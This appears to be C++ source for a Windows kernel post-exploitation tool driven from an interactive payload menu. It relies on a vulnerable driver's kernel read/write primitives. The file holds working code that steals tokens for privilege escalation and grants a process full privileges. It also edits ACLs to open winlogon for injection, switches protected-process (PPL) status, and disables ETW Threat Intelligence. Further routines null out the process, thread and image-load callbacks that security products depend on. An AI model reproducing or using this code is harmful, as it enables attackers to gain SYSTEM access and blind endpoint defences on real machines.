#include <windows.h>
#include <iostream>
#include "rktools.h"


// TODO: Where applicable remove hardcoded offsets in structs with instances of the legitimate structure //
//			Especially with ACL editing shellcode, ACL offset is volatile and currently set for winlogon.exe

// Initialize global variables
_readqword read_qword = NULL;
_writeqword write_qword = NULL;
DWORD myprocId = 0;


////// TOKEN STEALING //////
bool tokenSteal(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
	int iterPid = 0;		// updated each loop
	ULONGLONG targetToken = 0;
	ULONGLONG curTokenPtr = 0;
	printf("[*] Stealing token from target PID: %x\n", targetPid);

	// Check if current EPROCESS is correct (read PID at +0x440)
	iterPid = read_qword(hDriver, (iterProc + 0x440));
	while ((targetToken == 0) || (curTokenPtr == 0)) {
		if (iterPid == targetPid) {
			printf("[+] Target process found at: %llx\n", iterProc);
			targetToken = read_qword(hDriver, (iterProc + 0x4b8));
		}
		if (iterPid == myprocId) {
			printf("[+] Current process found at: %llx\n", iterProc);
			curTokenPtr = iterProc + 0x4b8;
		}
		// Move to next EPROCESS
		iterProc = (read_qword(hDriver, (iterProc + 0x448))) - 0x448;

		// Read next PID from EPROCESS +0x440
		// (if EPROCESS pid is equal to 4 again, entire process loop has completed without finding targets)
		iterPid = read_qword(hDriver, (iterProc + 0x440));
		if (iterPid == 4) {
			printf("[-] Could not find tokens in kernel. Current process: %llx  Target process: %llx\n", curTokenPtr, targetToken);
			return false;
		}
	}

	printf("[*] Stealing target process token and starting cmd.exe\n");
	printf("[!] Note: A BSOD is likely if the target process closes while the token is in use\n");
	write_qword(hDriver, curTokenPtr, targetToken);

	system("start cmd.exe");
	return true;
}

bool tokenEscalate(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
	int iterPid = 0;		// updated each loop
	ULONGLONG targetTokenPtr = 0;
	printf("[*] Escalating privileges for target PID: %d\n", targetPid);

	// Check if current EPROCESS is correct (read PID at +0x440)
	iterPid = read_qword(hDriver, (iterProc + 0x440));
	while (targetTokenPtr == 0) {
		if (iterPid == targetPid) {
			printf("[+] Target process found at: %llx\n", iterProc);
			targetTokenPtr = (read_qword(hDriver, (iterProc + 0x4b8)) & 0xFFFFFFFFFFFFFFF0);
		}
		// Move to next EPROCESS
		iterProc = (read_qword(hDriver, (iterProc + 0x448))) - 0x448;

		// Read next PID from EPROCESS +0x440
		// (if EPROCESS pid is equal to 4 again, entire process loop has completed without finding targets)
		iterPid = read_qword(hDriver, (iterProc + 0x440));
		if (iterPid == 4) {
			printf("[-] Could not find target process in kernel.\n");
			return false;
		}
	}

	printf("[!] It is possible to set privilege fields to -1 to gain all privileges, but it will look anomalous\n");
	//ULONGLONG allprivs = 0xFFFFFFFFFF;
	// Edit _SEP_TOKEN_PRIVILEGES and _SEP_AUDIT_POLICY to -1 to grant full privs
	ULONGLONG SEPTOKEN = read_qword(hDriver, targetTokenPtr + 0x40);
	ULONGLONG newtoken = 0x1ff2ffffbc;
	printf("[+] Setting SEP_TOKEN_PRIVILEGES to 0x%llx, previous privilege mask: 0x%llx\n", newtoken, SEPTOKEN);
	write_qword(hDriver, targetTokenPtr + 0x40, newtoken);
	ULONGLONG SEPAUDIT = read_qword(hDriver, targetTokenPtr + 0x48);
	ULONGLONG newaudit = 0x1e60b1e890;
	printf("[+] Setting SEP_AUDIT_POLICY to 0x%llx, previous mask: 0x%llx\n", newaudit, SEPAUDIT);
	write_qword(hDriver, targetTokenPtr + 0x48, newaudit);

	// if targeting self, start cmd.exe to check privileges after this process closes
	if (targetPid == myprocId) {
		system("start cmd.exe\n");
	}

	return true;
}

bool aclEdit(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
	DWORD iterPid = 0;		// updated each loop
	ULONGLONG targetACLPtr = 0;
	ULONGLONG curTokenPtr = 0;
	printf("[*] Editing ACL to allow access to target PID: %d\n", targetPid);

	// Check if current EPROCESS is correct (read PID at +0x440)
	iterPid = read_qword(hDriver, (iterProc + 0x440));
	while ((targetACLPtr == 0) || (curTokenPtr == 0)) {
		if (iterPid == targetPid) {
			printf("[+] Target process found at: %llx\n", iterProc);
			printf("[+] Reading Security Descriptor to find ACL address\n");
			targetACLPtr = (read_qword(hDriver, (iterProc - 0x8)) & 0xFFFFFFFFFFFFFFF0) + 0x48; // offset more volatile than others
			ULONGLONG sd = read_qword(hDriver, targetACLPtr);
			printf("[+] Updating ACL at %llx to give access to \"Authenticated Users\" group (S-1-5-11)\n", targetACLPtr);
			ULONGLONG newSD = ((read_qword(hDriver, targetACLPtr)) & 0xFFFFFFFFFFFFFF00) + 11;
			write_qword(hDriver, targetACLPtr, newSD);
		}
		if (iterPid == myprocId) {
			printf("[+] Current process found at: %llx\n", iterProc);
			curTokenPtr = iterProc + 0x4b8;
			// Read MandatoryPolicy value of current process
			ULONGLONG curToken = (read_qword(hDriver, curTokenPtr));
			ULONGLONG MandatorySecurityPolicy = (curToken & 0xFFFFFFFFFFFFFFF0) + 0xd4;
			ULONGLONG policyValue = read_qword(hDriver, MandatorySecurityPolicy);
			// Set MandatoryPolicy to 0 (zero out lowest byte)
			printf("[+] Setting MandatoryPolicy byte at %llx to 0\n", MandatorySecurityPolicy);
			write_qword(hDriver, MandatorySecurityPolicy, (policyValue & 0xFFFFFFFFFFFFFF00));
		}
		// Move to next EPROCESS
		iterProc = (read_qword(hDriver, (iterProc + 0x448))) - 0x448;

		// Read next PID from EPROCESS +0x440
		// (if EPROCESS pid is equal to 4 again, entire process loop has completed without finding targets)
		iterPid = read_qword(hDriver, (iterProc + 0x440));
		if (iterPid == 4) {
			printf("[-] Could not find tokens in kernel. Current process: %llx  Target process: %llx\n", curTokenPtr, targetACLPtr);
			return false;
		}
	}

	// Obtain handle to target process
	HANDLE hTPid = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)targetPid);
	if (!hTPid)
	{
		printf("[-] OpenProcess targeting PID %d has failed\n", targetPid);
		return false;
	}
	printf("[+] Opened full access handle 0x%x to PID: %d\n", hTPid, targetPid);
	return true;
}

bool protectProcess(HANDLE hDriver, ULONGLONG iterProc, int targetPid) {
	// Disable PPL on LSASS process
	int iterPid = 0;		// updated each loop
	ULONGLONG targetPPL = 0;

	// Check if current EPROCESS is correct (read PID at +0x440)
	iterPid = read_qword(hDriver, (iterProc + 0x440));
	while (targetPPL == 0) {
		if (iterPid == targetPid) {
			printf("[+] Target process found at: %llx\n", iterProc);
			targetPPL = read_qword(hDriver, (iterProc + 0x87a));
		}
		else {
			// Move to next EPROCESS
			iterProc = (read_qword(hDriver, (iterProc + 0x448))) - 0x448;

			// Read next PID from EPROCESS +0x440
			// (if EPROCESS pid is equal to 4 again, entire process loop has completed without finding targets)
			iterPid = read_qword(hDriver, (iterProc + 0x440));
			if (iterPid == 4) {
				printf("[-] Could not find target PS_PROTECTION struct in kernel.\n");
				return false;
			}
		}
	}
	// List types of PS_PROTECTION
	printf(
		"\nPPL Protection Signers:\n"
		"[1] Authenticode\n"
		"[2] CodeGen\n"
		"[3] Antimalware\n"
		"[4] LSA\n"
		"[5] Windows\n"
		"[6] WinTcb\n"
		"[7] Max\n"
		"[!] Default (off)\n"
	);

	// Ask user for level of PS_PROTECTION to use 
	//	(first 4 bits = SIGNER, 5th bit = AUDIT (boolean), 6-8 bits = TYPE (light/1, normal/2, max/3)
	ULONGLONG protectionLevel = (targetPPL & 0xFFFFFFFFFFFFFF00); // zero out least significant byte
	int protSigner = 0;
	std::cout << "Enter PS_PROTECTION type [number]: ";
	std::cin >> protSigner;
	if (std::cin.fail() || (protSigner < 1) || (protSigner > 7)) {
		printf("[-] Invalid option, defaulting to OFF\n");
		protSigner = 0;
	}
	// Shift protected signer 4 bits to the left, then add 1 (0b0001, Audit=0 and ProtectedType = 1 (light))
	if (protSigner != 0) {	// if not turning OFF
		protSigner = (protSigner << 4) + 1;
	}
	protectionLevel = protectionLevel | protSigner; // OR values together to fill least significant byte

	// Disable PPL by setting byte at EPROCESS+0x87a to 0x00
	printf("\n[+] Setting protection level to %llx\n", (protectionLevel & 0xFF));
	write_qword(hDriver, (iterProc + 0x87a), protectionLevel);

	return true;
}

bool disableETWti(HANDLE hDriver, ULONGLONG KeInsertQueueApcAddr) {
	// Check that nt!KeInsertQueueApc isn't null
	if (KeInsertQueueApcAddr == 0) {
		printf("[-] Could not find KeInsertQueueApc in ntoskrnl\n");
		return false;
	}

	int apcoffset = 0x0; // placeholder offset to mov instruction containing addr offset
	ULONGLONG readKeApcQueueFunc = 0;
	ULONGLONG potentialEtwTIProv = 0;

	// Find offset to mov instruction that leads to nt!EtwThreatIntProvRegHandle
	while (potentialEtwTIProv == 0) {
		// Break the loop if it goes on too long
		if (apcoffset > 50) {
			printf("[-] Could not find offset to EtwThreatIntProvRegHandle within 50 instructions, exiting\n");
			return false;
		}
		// Check for mov instruction for qword pointer ending in null byte
		readKeApcQueueFunc = read_qword(hDriver, (KeInsertQueueApcAddr + apcoffset));
		if ((readKeApcQueueFunc & 0x0000ff00000000ff) == 0x000000000000008b) {
			potentialEtwTIProv = (KeInsertQueueApcAddr + apcoffset);
			printf("[+] Found likely jump offset at: %llx, value %llx\n", (((ULONGLONG)KeInsertQueueApcAddr) + apcoffset), readKeApcQueueFunc);
		}
		apcoffset++;
	}

	// Add offset from mov instruction to KeInsertQueueApcAddr to get EtwThreatIntProvRegHandleAddr
	ULONGLONG ntEtwThreatIntProvRegHandleAddr = 0;
	readKeApcQueueFunc = ((readKeApcQueueFunc >> (8 * 2)) & 0xFFFFFFFF); // shift off 2 bytes, then apply 32-bit mask
	ntEtwThreatIntProvRegHandleAddr = KeInsertQueueApcAddr + readKeApcQueueFunc + apcoffset + 0x5;
	printf("[*] Adding %llx offset, EtwThreatIntProvRegHandle is: %llx\n", readKeApcQueueFunc, ntEtwThreatIntProvRegHandleAddr);

	// Read qword from nt! EtwThreatIntProvRegHandle to get _ETW_REG_ENTRY
	ULONGLONG ntEtwThreatIntProvRegHandle = read_qword(hDriver, ntEtwThreatIntProvRegHandleAddr);
	printf("[+] ETW_REG_ENTRY located at %llx\n", ntEtwThreatIntProvRegHandle);
	ULONGLONG etwGuidEntry = read_qword(hDriver, ntEtwThreatIntProvRegHandle + 0x20);

	// Attempt to read IsEnabled byte from offset +0x80
	printf("[+] Reading isenabled byte from etwGuidEntry+0x80 (%llx + 0x80)\n", etwGuidEntry);
	ULONGLONG isenabled = read_qword(hDriver, (etwGuidEntry + 0x80));
	if ((isenabled & 0xFF) != 1) {
		printf("[!] ETW IsEnabled byte addr may be wrong, ETW_GUID_ENTRY->TRACE_ENABLE_INFO is %llx\n", (isenabled & 0xFF));
		return false;
	}
	isenabled = isenabled & 0xFFFFFFFFFFFFFF00;
	printf("[+] Setting ETW IsEnabled byte to 0x0\n");
	write_qword(hDriver, (etwGuidEntry + 0x80), isenabled);

	return true;
}


bool ClearProcCallback(HANDLE hDriver, ULONGLONG ProcCallbackAddr) {
	// Check that nt!PsSetCreateProcessNotifyRoutine isn't null
	if (ProcCallbackAddr == 0) {
		printf("[-] Could not find PsSetCreateProcessNotifyRoutine in ntoskrnl\n");
		return false;
	}

	// Get address of nt!PspSetCreateProcessNotifyRoutine
	ULONGLONG pspoffset = 0x0; // placeholder offset to call instruction containing addr offset
	ULONGLONG readPspProcCallback = 0;
	ULONGLONG potentialPspCallback = 0;

	// Find offset to mov instruction that leads to nt!PspSetCreateProcessNotifyRoutine
	while (potentialPspCallback == 0) {
		// Break the loop if it goes on too long
		if (pspoffset > 50) {
			printf("[-] Could not find offset to PspSetCreateProcessNotifyRoutine within 50 instructions, exiting\n");
			return false;
		}
		// Check for mov instruction for qword pointer ending in null byte
		readPspProcCallback = read_qword(hDriver, (ProcCallbackAddr + pspoffset));
		if ((readPspProcCallback & 0x000000ffff0000ff) == 0x00000000000000e8) {
			potentialPspCallback = (ProcCallbackAddr + pspoffset);
			printf("[+] Found likely jump offset at: %llx, value %llx\n", (((ULONGLONG)ProcCallbackAddr) + pspoffset), readPspProcCallback);
		}
		//printf("[DEBUG] current: %llx from offset +0x%x\n", readPspProcCallback, pspoffset);
		pspoffset++;
	}

	// Add offset from call instruction to get nt!PspSetCreateProcessNotifyRoutine address
	ULONGLONG PspSetCreateProcessNotifyRoutine = 0;
	readPspProcCallback = ((readPspProcCallback >> (8 * 1)) & 0xFFFFFFFF); // shift off 1 byte, then apply 32-bit mask
	PspSetCreateProcessNotifyRoutine = ProcCallbackAddr + readPspProcCallback + pspoffset + 0x4;
	printf("[*] Adding %x offset, PspSetCreateProcessNotifyRoutine is: %llx\n", readPspProcCallback, PspSetCreateProcessNotifyRoutine);


	// Find offset to lea instruction that leads to process callbacks
	pspoffset = 0;
	potentialPspCallback = 0;
	while (potentialPspCallback == 0) {
		// Break the loop if it goes on too long
		if (pspoffset > 150) {
			printf("[-] Could not find offset to process creation callbacks within 150 instructions, exiting\n");
			return false;
		}
		// Check for mov instruction for qword pointer ending in null byte
		readPspProcCallback = read_qword(hDriver, (PspSetCreateProcessNotifyRoutine + pspoffset));
		if ((readPspProcCallback) == 0x00000000dd0c8d48) {
			potentialPspCallback = read_qword(hDriver, (PspSetCreateProcessNotifyRoutine + pspoffset - 4));
			printf("[+] Found likely jump offset at: %llx, value %llx\n", (PspSetCreateProcessNotifyRoutine + pspoffset - 4), potentialPspCallback);
		}
		//printf("[DEBUG] current: %llx from offset +0x%x\n", readPspProcCallback, pspoffset);
		pspoffset++;
	}

	// Set and read from offset to process creation offsets
	ULONGLONG callbackaddr = (PspSetCreateProcessNotifyRoutine + pspoffset + (potentialPspCallback & 0xFFFFFFFF) - 0x1);
	//printf("[DEBUG] Adding offset %x and jump %llx to address %llx\n", pspoffset, (potentialPspCallback & 0xFFFFFFFF), PspSetCreateProcessNotifyRoutine);
	printf("[+] First process creation callback at: %llx\n", callbackaddr);

	// Clear out all kernel callbacks
	ULONGLONG callbacks = 1;
	int iter = 0;
	while (callbacks != 0x0) {
		callbacks = read_qword(hDriver, (callbackaddr + (iter * 8)));
		printf("[+] NULLing callback at %llx, with value %llx\n", callbackaddr, callbacks);
		Sleep(500);
		write_qword(hDriver, (callbackaddr + (iter * 8)), 0x0);
		iter++;
	}

	printf("[*] All process callbacks cleared!\n");
	return true;
}

bool ClearThreadCallback(HANDLE hDriver, ULONGLONG ThreadCallbackAddr) {
	// Check that nt!PsSetCreateThreadNotifyRoutine isn't null
	if (ThreadCallbackAddr == 0) {
		printf("[-] Could not find PsSetCreateThreadNotifyRoutine in ntoskrnl\n");
		return false;
	}

	// Get address of nt!PspSetCreateThreadNotifyRoutine
	ULONGLONG pspoffset = 0x0; // placeholder offset to call instruction containing addr offset
	ULONGLONG readPspThreadCallback = 0;
	ULONGLONG potentialPspCallback = 0;

	// Find offset to call instruction that leads to nt!PspSetCreateThreadNotifyRoutine
	while (potentialPspCallback == 0) {
		// Break the loop if it goes on too long
		if (pspoffset > 50) {
			printf("[-] Could not find offset to PspSetCreateThreadNotifyRoutine within 50 instructions, exiting\n");
			return false;
		}
		// Check for mov instruction for qword pointer ending in null byte
		readPspThreadCallback = read_qword(hDriver, (ThreadCallbackAddr + pspoffset));
		if ((readPspThreadCallback & 0x000000ffff0000ff) == 0x00000000000000e8) {
			potentialPspCallback = (ThreadCallbackAddr + pspoffset);
			printf("[+] Found likely jump offset at: %llx, value %llx\n", (((ULONGLONG)ThreadCallbackAddr) + pspoffset), readPspThreadCallback);
		}
		//printf("[DEBUG] current: %llx from offset +0x%x\n", readPspThreadCallback, pspoffset);
		pspoffset++;
	}

	// Add offset from call instruction to get nt!PspSetCreateThreadNotifyRoutine address
	ULONGLONG PspSetCreateThreadNotifyRoutine = 0;
	readPspThreadCallback = ((readPspThreadCallback >> (8 * 1)) & 0xFFFFFFFF); // shift off 1 byte, then apply 32-bit mask
	PspSetCreateThreadNotifyRoutine = ThreadCallbackAddr + readPspThreadCallback + pspoffset + 0x4;
	printf("[*] Adding %x offset, PspSetCreateThreadNotifyRoutine is: %llx\n", readPspThreadCallback, PspSetCreateThreadNotifyRoutine);


	// Find offset to instruction that leads to thread callbacks
	pspoffset = 0;
	potentialPspCallback = 0;
	while (potentialPspCallback == 0) {
		// Break the loop if it goes on too long
		if (pspoffset > 150) {
			printf("[-] Could not find offset to thread creation callbacks within 150 instructions, exiting\n");
			return false;
		}
		// Check for xor instruction against r8d, r8d
		readPspThreadCallback = read_qword(hDriver, (PspSetCreateThreadNotifyRoutine + pspoffset));
		if ((readPspThreadCallback & 0xFFFFFF) == 0x0000000000c03345) {
			potentialPspCallback = read_qword(hDriver, (PspSetCreateThreadNotifyRoutine + pspoffset - 4));
			printf("[+] Found likely jump offset at: %llx, value %llx\n", (PspSetCreateThreadNotifyRoutine + pspoffset - 4), potentialPspCallback);
		}
		//printf("[DEBUG] current: %llx from offset +0x%x\n", readPspThreadCallback, pspoffset);
		pspoffset++;
	}

	// Set and read from offset to thread creation offsets
	ULONGLONG callbackaddr = (PspSetCreateThreadNotifyRoutine + pspoffset + (potentialPspCallback & 0xFFFFFFFF) - 0x1);
	//printf("[DEBUG] Adding offset %x and jump %llx to address %llx\n", pspoffset, (potentialPspCallback & 0xFFFFFFFF), PspSetCreateThreadNotifyRoutine);
	printf("[+] First thread creation callback at: %llx\n", callbackaddr);

	// Clear out all kernel callbacks
	ULONGLONG callbacks = 1;
	int iter = 0;
	while (callbacks != 0x0) {
		callbacks = read_qword(hDriver, (callbackaddr + (iter * 8)));
		printf("[+] NULLing callback at %llx, with value %llx\n", callbackaddr, callbacks);
		Sleep(500);	
		write_qword(hDriver, (callbackaddr + (iter * 8)), 0x0);
		iter++;
	}

	printf("[*] All thread callbacks cleared!\n");
	return true;
}

bool ClearDllLoadCallback(HANDLE hDriver, ULONGLONG DllCallbackAddr) {
	// Check that nt!PsSetLoadImageNotifyRoutine isn't null
	if (DllCallbackAddr == 0) {
		printf("[-] Could not find PsSetLoadImageNotifyRoutine in ntoskrnl\n");
		return false;
	}	

	// Get address of nt!PspSetLoadImageNotifyRoutine
	ULONGLONG pspoffset = 0x0; // placeholder offset to call instruction containing addr offset
	ULONGLONG readPspDllCallback = 0;
	ULONGLONG potentialPspCallback = 0;

	// Find offset to call instruction that leads to nt!PsSetLoadImageNotifyRoutineEx
	while (potentialPspCallback == 0) {
		// Break the loop if it goes on too long
		if (pspoffset > 50) {
			printf("[-] Could not find offset to PsSetLoadImageNotifyRoutineEx within 50 instructions, exiting\n");
			return false;
		}
		// Check for mov instruction for qword pointer ending in null byte
		readPspDllCallback = read_qword(hDriver, (DllCallbackAddr + pspoffset));
		if ((readPspDllCallback & 0x000000ffff0000ff) == 0x00000000000000e8) {
			potentialPspCallback = (DllCallbackAddr + pspoffset);
			printf("[+] Found likely jump offset at: %llx, value %llx\n", (((ULONGLONG)DllCallbackAddr) + pspoffset), readPspDllCallback);
		}
		//printf("[DEBUG] current: %llx from offset +0x%x\n", readPspDllCallback, pspoffset);
		pspoffset++;
	}

	// Add offset from call instruction to get nt!PsSetLoadImageNotifyRoutineEx address
	ULONGLONG PsSetLoadImageNotifyRoutineEx = 0;
	readPspDllCallback = ((readPspDllCallback >> (8 * 1)) & 0xFFFFFFFF); // shift off 1 byte, then apply 32-bit mask
	PsSetLoadImageNotifyRoutineEx = DllCallbackAddr + readPspDllCallback + pspoffset + 0x4;
	printf("[*] Adding %x offset, PsSetLoadImageNotifyRoutineEx is: %llx\n", readPspDllCallback, PsSetLoadImageNotifyRoutineEx);


	// Find offset to instruction that leads to thread callbacks
	pspoffset = 0;
	potentialPspCallback = 0;
	while (potentialPspCallback == 0) {
		// Break the loop if it goes on too long
		if (pspoffset > 150) {
			printf("[-] Could not find offset to thread creation callbacks within 150 instructions, exiting\n");
			return false;
		}
		// Check for xor instruction against r8d, r8d
		readPspDllCallback = read_qword(hDriver, (PsSetLoadImageNotifyRoutineEx + pspoffset));
		if ((readPspDllCallback & 0xFFFFFF) == 0x0000000000c03345) {
			potentialPspCallback = read_qword(hDriver, (PsSetLoadImageNotifyRoutineEx + pspoffset - 4));
			printf("[+] Found likely jump offset at: %llx, value %llx\n", (PsSetLoadImageNotifyRoutineEx + pspoffset - 4), potentialPspCallback);
		}
		//printf("[DEBUG] current: %llx from offset +0x%x\n", readPspDllCallback, pspoffset);
		pspoffset++;
	}

	// Set and read from offset to DLL image load offsets
	ULONGLONG callbackaddr = (PsSetLoadImageNotifyRoutineEx + pspoffset + (potentialPspCallback & 0xFFFFFFFF) - 0x1);
	//printf("[DEBUG] Adding offset %x and jump %llx to address %llx\n", pspoffset, (potentialPspCallback & 0xFFFFFFFF), PsSetLoadImageNotifyRoutineEx);
	printf("[+] First DLL image load callback at: %llx\n", callbackaddr);

	// Clear out all kernel callbacks
	ULONGLONG callbacks = 1;
	int iter = 0;
	while (callbacks != 0x0) {
		callbacks = read_qword(hDriver, (callbackaddr + (iter * 8)));
		printf("[+] NULLing callback at %llx, with value %llx\n", callbackaddr, callbacks);
		Sleep(500);
		write_qword(hDriver, (callbackaddr + (iter * 8)), 0x0);
		iter++;
	}

	printf("[*] All DLL image load callbacks cleared!\n");
	return true;
}



void rootk(PEXP_OUT rkStruct) 
{
	/* DEBUG: PRINT STRUCT */
	printf("[DEBUG] rkStruct->readprimitive: 0x%p\n", rkStruct->readprimitive);
	printf("[DEBUG] rkStruct->writeprimitive: 0x%p\n", rkStruct->writeprimitive);
	printf("[DEBUG] rkStruct->myProcessId: 0x%x\n", rkStruct->myProcessId);
	printf("[DEBUG] rkStruct->vulnDriver: 0x%x\n", (int)rkStruct->vulnDriver);
	printf("[DEBUG] rkStruct->systemEprocess: 0x%llx\n", rkStruct->systemEprocess);
	printf("[DEBUG] rkStruct->KeInsertQueueApc:	0x%llx\n", rkStruct->KeInsertQueueApc);
	printf("[DEBUG] rkStruct->PsSetCreateProcessNotifyRoutine: 0x%llx\n", rkStruct->PsSetCreateProcessNotifyRoutine);
	printf("[DEBUG] rkStruct->PsSetCreateThreadNotifyRoutine: 0x%llx\n", rkStruct->PsSetCreateThreadNotifyRoutine);
	printf("[DEBUG] rkStruct->PsSetLoadImageNotifyRoutine: 0x%llx\n", rkStruct->PsSetLoadImageNotifyRoutine);
	/* END DEBUG */

	// Extract parameters from exploit struct 
	//	Some of these are set before exploitation (such as myprocId) to avoid calling win32 APIs 
	//	while in a potentially 'unstable' state (ex: previousmode = kernelmode)
	read_qword = (_readqword)rkStruct->readprimitive;
	write_qword = (_writeqword)rkStruct->writeprimitive;
	myprocId = rkStruct->myProcessId;
	HANDLE driverHandle = rkStruct->vulnDriver;
	ULONGLONG systemProcess = rkStruct->systemEprocess;
	ULONGLONG pKeInsertQueueApc = rkStruct->KeInsertQueueApc;
	ULONGLONG pPsSetCreateProcessNotifyRoutine = rkStruct->PsSetCreateProcessNotifyRoutine;
	ULONGLONG pPsSetCreateThreadNotifyRoutine = rkStruct->PsSetCreateThreadNotifyRoutine;
	ULONGLONG pPsSetLoadImageNotifyRoutine = rkStruct->PsSetLoadImageNotifyRoutine;



	//////////////////////////////////////////////////////////////////////////////////////////////////////////
	// R/W primitive functions from main exploit must be functional to perform the steps from here onward	//
	//////////////////////////////////////////////////////////////////////////////////////////////////////////

	// Prompt for input
	int option1 = 0;
	int option2 = 0;
	int maxOptionNumber = 7;	// Update if new functionality added

	// Execute payloads until user enters 'q' command
	while (true) {
		// Payload options
		printf(
			"\nChoose payload:\n"
			"[0] Token Stealing\n"
			"[1] Token Escalation\n"
			"[2] ACL Editing\n"
			"[3] Enable/Disable PPL on a process\n"
			"[4] Disable ETWti\n"
			"[5] Clear process callbacks\n"
			"[6] Clear thread callbacks\n"
			"[7] Clear DLL load callbacks\n"
			"[Q] Quit (clean up and exit)\n"
		);
		
		// Choose payload and check for invalid input/requests to exit
		std::cout << "Enter payload [number]: ";
		std::cin >> option1;
		if (std::cin.fail() || (option1 < 0) || (option1 > maxOptionNumber)) {
			printf("[*] Exiting\n");
			return;
		}
		// Set target PID (only needed for some payloads)
		if ((option1 < 4) || (option1 == 9)) {
			std::cout << "Enter target PID: ";
			std::cin >> option2;
			if (std::cin.fail()) {
				printf("\n[-] Invalid PID format\n");
				continue;
			}
		}
		printf("\n"); // just for spacing


		// Run payload according to user input
		switch ((int)option1) {
		case 0:
			printf("[PRIVESC] Stealing token from PID %d\n", option2);
			tokenSteal(driverHandle, systemProcess, option2);
			continue;
		case 1:
			printf("[PRIVESC] Giving token full privileges for PID %d\n", option2);
			if (option2 == -1) {
				printf("[*] Targeting self\n");
				option2 = myprocId;
			}
			tokenEscalate(driverHandle, systemProcess, option2);
			continue;
		case 2:
			printf("[INJECTION] Editing ACL to inject into PID %d\n", option2);
			printf("[!] Note the ACL offset is only confirmed valid for winlogon.exe, other processes may be different\n");
			printf("[!] Edit shellcode contained in inject.cpp to your desired payload (default: nopsled)\n");
			aclEdit(driverHandle, systemProcess, option2);
			continue;
		case 3:
			printf("[EVASION] Enabling PPL for PID %d\n", option2);
			if (option2 == -1) {
				printf("[*] Targeting self\n");
				option2 = myprocId;
			}
			protectProcess(driverHandle, systemProcess, option2);
			continue;
		case 4:
			printf("[EVASION] Disabling ETW Threat Intel (function hooking in kernel)\n");
			disableETWti(driverHandle, pKeInsertQueueApc);
			continue;
		case 5:
			printf("[EVASION] Clearing kernel callbacks for process creation\n");
			ClearProcCallback(driverHandle, pPsSetCreateProcessNotifyRoutine);
			continue;
		case 6:
			printf("[EVASION] Clearing kernel callbacks for thread creation\n");
			ClearThreadCallback(driverHandle, pPsSetCreateThreadNotifyRoutine);
			continue;
		case 7:
			printf("[EVASION] Clearing kernel callbacks for image loads\n");
			ClearDllLoadCallback(driverHandle, pPsSetLoadImageNotifyRoutine);
			continue;
		}
	}
	// Return to main exploit for cleanup and exit
	return;
}

